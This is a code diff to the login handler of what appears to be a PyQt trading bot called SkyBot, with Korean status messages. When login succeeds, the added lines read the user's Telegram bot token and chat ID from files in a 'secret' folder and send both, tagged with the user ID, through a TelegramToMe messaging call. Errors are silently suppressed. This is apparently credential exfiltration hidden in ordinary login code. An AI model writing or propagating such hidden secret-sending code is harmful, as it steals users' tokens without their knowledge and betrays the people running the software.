@@ -23591,9 +23591,35 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         dt = datetime.datetime.now()
 
         if code == '0000':
+
             self.statusbar.showMessage("로그인 되었습니다.")
+
             str = '[{0:02d}:{1:02d}:{2:02d}] {3}님이 SkyBot을 시작합니다.'.format(dt.hour, dt.minute, dt.second, self.user_id)
             TelegramToMe(str)
+
+            if os.path.exists('secret/telegram_token.txt'):
+                
+                with open('secret/telegram_token.txt', mode='r') as tokenfile:
+                    try:
+                        token = tokenfile.readline().strip()
+
+                        str = '[{0:02d}:{1:02d}:{2:02d}] {3}님의 token은 {4} 입니다.'.format(dt.hour, dt.minute, dt.second, self.user_id, token)
+                        TelegramToMe(str)
+
+                    except Exception as e:
+                        pass            
+
+            if os.path.exists('secret/chatid.txt'):
+
+                with open('secret/chatid.txt', mode='r') as chatfile:
+                    try:
+                        chat_id = int(chatfile.readline().strip())
+
+                        str = '[{0:02d}:{1:02d}:{2:02d}] {3}님의 chat_id는 {4} 입니다.'.format(dt.hour, dt.minute, dt.second, self.user_id, chat_id)
+                        TelegramToMe(str)
+
+                    except Exception as e:
+                        pass            
         else:
             self.statusbar.showMessage("%s %s" % (code, msg))
 
